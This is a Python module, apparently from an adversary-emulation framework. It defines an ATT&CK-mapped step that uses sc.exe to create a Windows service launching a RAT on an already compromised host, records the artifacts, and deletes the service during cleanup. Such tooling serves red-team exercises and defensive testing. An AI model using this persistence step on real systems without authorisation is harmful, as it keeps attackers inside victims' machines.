from plugins.adversary.app.commands import sc
from plugins.adversary.app.operation.operation import Step, OPFile, OPHost, OPRat, OPVar, OPPersistence, OPService


class ScPersist(Step):
    """
    Description:
        Creates a service on a target machine in order to establish persistence, using sc.exe.
    Requirements:
        Requires an elevated RAT, and a accessible copy of the RAT on the target machine.
    """
    attack_mapping = [('T1050', 'Persistence'), ('T1050', 'Privilege Escalation'), ('T1106', 'Execution')]
    display_name = "sc_persist"
    summary = "Use sc.exe to achieve persistence by creating a service on compromised hosts"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host"))),
                     ('rat_file', OPFile({'host': OPVar('host'), 'use_case': 'rat'}))]

    postconditions = [("service_g", OPService({"host": OPVar("host")})),
                      ("persist_g", OPPersistence({"host": OPVar("host"), "elevated": True}))]

    significant_parameters = ['host']

    preproperties = ["rat_file.path"]

    postproperties = ["service_g.name", "persist_g.service_artifact", "service_g.bin_path"]

    @staticmethod
    def description(rat, host):
        return "Using sc.exe to create a service on {}".format(host.hostname)

    @staticmethod
    async def simulate(operation, rat, host, rat_file, service_g, persist_g):
        return True

    @staticmethod
    async def action(operation, rat, host, rat_file, service_g, persist_g):
        svcname = operation.adversary_artifactlist.get_service_word()
        bin_path = '"cmd /K start {}"'.format(rat_file.path)

        await operation.execute_shell_command(rat, *sc.create(bin_path, svcname))

        service = await service_g({'name': svcname, 'bin_path': bin_path})
        await persist_g({'service_artifact': service})

        return True

    @staticmethod
    async def cleanup(cleaner, service_g):
        for service in service_g:
            await cleaner.delete(service)
